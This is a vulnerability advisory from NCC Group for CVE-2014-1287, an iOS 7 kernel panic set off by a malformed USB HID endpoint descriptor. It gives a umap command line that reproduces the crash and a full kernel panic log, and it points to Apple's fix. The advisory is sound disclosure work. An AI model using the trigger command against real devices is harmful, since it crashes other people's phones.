@@ -1,0 +1,112 @@
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ Vulnerability Summary
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ Title             iOS 7 arbitrary code execution in kernel mode
+ Release Date      14 March 2014
+ Reference         NGS00596
+ Discoverer        Andy Davis 
+ Vendor            Apple
+ Vendor Reference  600217059
+ Systems Affected  iPhone 4 and later, iPod touch (5th generation) and later, 
+                   iPad 2 and later
+ CVE Reference     CVE-2014-1287
+ Risk              High
+ Status            Fixed
+
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ Resolution Timeline
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ Discovered        26 September 2013
+ Reported          26 September 2013
+ Released          26 September 2013
+ Fixed             10 March 2014
+ Published         14 March 2014
+
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ Vulnerability Description 
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ When a specific value is supplied in USB Endpoint descriptor for a HID device 
+ the Apple device kernel panics and reboots
+
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ Technical Details
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ The bug can be triggered using umap (https://github.com/nccgroup/umap)
+ as follows:
+
+ sudo python3 ./umap.py -P /dev/ttyUSB0 -s 09:00:00:E:46
+
+ bMaxPacketSize = 0xff
+
+ Incident Identifier: F0856C91-7616-4DAC-9907-C504401D9951
+ CrashReporter Key:   7ed804add6a0507b6a8ca9625f0bcd14abc6801b
+ Hardware Model:      iPhone3,1
+ Date/Time:           2013-09-26 12:35:46.892 +0100
+ OS Version:          iOS 7.0 (11A465)
+
+ panic(cpu 0 caller 0x882220a5): kernel abort type 4: fault_type=0x1, 
+ fault_addr=0x28
+ r0:   0x00000003  r1: 0x889e70bd  r2: 0x00000012  r3: 0xfffffffe
+ r4:   0x9ae83000  r5: 0x00000003  r6: 0x00000000  r7: 0x87ff3d78
+ r8:   0x00000000  r9: 0x00000000 r10: 0x00000000 r11: 0x00000001
+ r12:  0x87ff3d50  sp: 0x87ff3d10  lr: 0x88af52bf  pc: 0x88af51f8
+ cpsr: 0x80000033 fsr: 0x00000005 far: 0x00000028
+
+ Debugger message: panic
+ OS version: 11A465
+ Kernel version: Darwin Kernel Version 14.0.0: Tue Aug 13 21:39:05 PDT 2013; 
+ root:xnu-2423.1.73~3/RELEASE_ARM_S5L8930X
+ iBoot version: iBoot-1940.1.75
+ secure boot?: YES
+ Paniclog version: 1
+ Kernel slide:     0x0000000008200000
+ Kernel text base: 0x88201000
+ Epoch Time:        sec       usec
+   Boot    : 0x52441b69 0x00000000
+   Sleep   : 0x00000000 0x00000000
+   Wake    : 0x00000000 0x00000000
+   Calendar: 0x52441bb5 0x00056497
+
+ Panicked task 0x896f8d48: 12856 pages, 114 threads: pid 0: kernel_task
+ panicked thread: 0x8023de90, backtrace: 0x87ff3a48
+      lr: 0x88317889  fp: 0x87ff3a7c
+      lr: 0x883181f7  fp: 0x87ff3ab0
+      lr: 0x882b783b  fp: 0x87ff3ad4
+      lr: 0x882220a5  fp: 0x87ff3ba0
+      lr: 0x8821c7c4  fp: 0x87ff3d78
+      lr: 0x88af8687  fp: 0x87ff3da8
+      lr: 0x8828b5bd  fp: 0x87ff3dd0
+      lr: 0x889d6d29  fp: 0x87ff3df0
+      lr: 0x889da2f3  fp: 0x87ff3e18
+      lr: 0x8828b5bd  fp: 0x87ff3e40
+      lr: 0x889da14f  fp: 0x87ff3e7c
+      lr: 0x88acb8e7  fp: 0x87ff3eb8
+      lr: 0x88ac9815  fp: 0x87ff3ed4
+      lr: 0x884b24d3  fp: 0x87ff3f60
+      lr: 0x882cf869  fp: 0x87ff3fa8
+      lr: 0x8821f05c  fp: 0x00000000
+
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ Fix Information
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ A patch can be downloaded from the following location:
+ http://support.apple.com/kb/HT1222
+  
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+ NCC Group
+~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
+
+ Research     https://www.nccgroup.com/research
+ Twitter      https://www.twitter.com/NCCGroupInfoSec / @NCCGroupInfoSec
+ Open Source  https://github.com/nccgroup
+ Blog         https://www.nccgroup.com/en/blog/cyber-security/
+ SlideShare   http://www.slideshare.net/NCC_Group/
+
+
+For more information please visit <a href="http://www.mimecast.com">http://www.mimecast.com<br>
+This email message has been delivered safely and archived online by Mimecast.
